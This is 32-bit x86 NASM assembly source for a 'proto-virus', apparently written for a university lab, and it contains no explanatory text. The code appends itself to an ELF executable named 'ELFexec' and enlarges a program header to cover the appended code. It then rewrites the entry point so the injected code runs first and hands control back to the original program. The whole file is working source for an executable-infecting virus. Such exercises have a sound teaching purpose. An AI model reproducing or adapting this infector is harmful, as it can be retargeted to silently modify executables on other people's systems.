%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro realAdd 1
    xor edi, edi
    call get_my_loc             
    mov edi, next_i
    sub edi, %1
    sub ecx, edi 
%endmacro

%macro gePtr 1
    xor edi, edi
    mov edi, ebp               
    sub edi, %1
%endmacro

%macro cmpLow 0
    cmp eax, 0
    jl elfFailure              	
%endmacro

%macro cmpEqLow 0
    cmp eax, 0
    jle elfFailure              	
%endmacro

%define	STK_RES	200
%define	RDWR 2
%define	SEEK_END 2
%define SEEK_SET 0

%define STDOUT 1
%define ENTRY 24
%define PHDR_start 28
%define	PHDR_size 32
%define PHDR_memsize 20	
%define PHDR_filesize 16
%define	PHDR_offset	4
%define	PHDR_vaddr 8
%define OutStr_size 31
%define elfFailureStr_size 49
%define header_size 52
%define firstPHeader 0x08048000

global _start

section .text
    _start:	
        push ebp
        mov	ebp, esp
        sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
    
    dispVirusMsg:
        realAdd OutStr
        write STDOUT, ecx, OutStr_size
        cmpEqLow

    loadFile:
        realAdd FileName
        mov [ebp - 4], ecx
        open [ebp - 4], RDWR, 777    ; returned val is fd and stored in eax
        cmpEqLow        
        mov [ebp - 4], eax          ; fd is now in [ebp - 4] local var.
        
    validateELF:
        gePtr 8
        read [ebp - 4], edi, 4     
        cmp eax, 0
        jle elfFailure              ; if read failed

        .validate_sym:
            mov edx, [ebp - 8]
            cmp dl, byte 0x7F
            jne elfFailure

        .validate_E:
            mov edx, [ebp - 7]
            cmp byte dl, 'E'
            jne elfFailure

        .validate_L:
            mov edx, [ebp - 6]
            cmp byte dl, 'L'
            jne elfFailure

        .validate_F:
            mov edx, [ebp - 5]
            cmp byte dl, 'F'
            jne elfFailure

    addVirusCode:
        ; lseek(file, hwo much to proceed, from where to proceed)   

        .calcSize:    
            xor esi, esi 
            mov esi, virus_end
            sub esi, _start
            mov [ebp - 136], esi

        .lseek:
            lseek [ebp - 4], 0, SEEK_END   ;proceed 0 bytes from end.
            cmpEqLow
            mov [ebp - 12], eax

        .writeVirus:
            realAdd _start
            write [ebp - 4], ecx, [ebp - 136]
            cmpEqLow

            lseek [ebp - 4], 0, SEEK_SET   
            cmpLow

        .loadHeader:
            gePtr 64
            read [ebp - 4], edi, header_size
            cmpEqLow

        .saveEntryPoint:
            xor eax, eax
            mov eax, [ebp - 64 + ENTRY]
            mov [ebp - 68], eax
	
        .loadPHeaders:
            gePtr 64
            xor esi, esi
            mov esi, [edi + PHDR_start]
            lseek [ebp - 4], esi, SEEK_SET            ; program header 
            cmpLow
            gePtr 132
            read [ebp - 4], edi ,2*PHDR_size
            cmpEqLow  

        .findVAddr: 
            xor eax, eax   
            mov eax, [ebp - 132 + PHDR_size + PHDR_vaddr]             ; first header's virtual address (stored in ebx)
            sub eax, [ebp - 132 + PHDR_size + PHDR_offset]
            mov [ebp - 140], eax

        .updateSizes:
            xor esi, esi
            mov esi, [ebp - 136] ; esi is now holding virus size
            mov ebx, [ebp - 12]
            add esi, ebx ;esi is now holding file size + virus size
            xor ebx, ebx
            mov ebx, [ebp - 132 + PHDR_size + PHDR_offset]
            sub esi, ebx ; result
            mov [ebp - 132 + PHDR_size + PHDR_filesize], esi
            mov [ebp - 132 + PHDR_size + PHDR_memsize], esi

        .updateSizesInFile:
            gePtr 64
            xor esi, esi
            mov esi, [edi + PHDR_start]
            lseek [ebp - 4], esi, SEEK_SET            ; program header 
            cmpEqLow
            gePtr 132
            write [ebp - 4], edi, 2*PHDR_size
            cmpEqLow
            
        .changeEntryPoint:
            xor ebx, ebx
            mov ebx, [ebp - 12]
            add ebx, [ebp - 140]
            mov [ebp - 64 + ENTRY], ebx

            lseek [ebp - 4], 0, SEEK_SET   
            cmpLow

        .updateHeaderInFile:
            gePtr 64
            write [ebp - 4], edi, header_size
            cmpEqLow

        .addPrevEntryPointToFile:
            lseek [ebp - 4], -4, SEEK_END   ;proceed 0 bytes from end.
            cmpEqLow

            gePtr 68
            write [ebp - 4], edi, 4
            cmpEqLow

        .closeFile:
            close [ebp - 4]
            cmpLow
          
    closeProgram:
        realAdd PreviousEntryPoint
        jmp [ecx]			; going back to the offeset - going back entry point

    elfFailure:
        realAdd elfFailureStr
        write STDOUT, ecx, elfFailureStr_size
        close [ebp - 4]
        exit 1

    VirusExit:
        exit 0              ; Termination if all is OK and no previous code to jump to
                            ; (also an example for use of above macros)
        
    FileName:		db "ELFexec", 0
    OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
    elfFailureStr:	db "opening file failed or file is not elf formatted", 10, 0
    Failstr:       	db "perhaps not", 10 , 0
    get_my_loc:
        call next_i
    next_i:
        pop ecx
        ret
    PreviousEntryPoint: dd VirusExit
    virus_end:
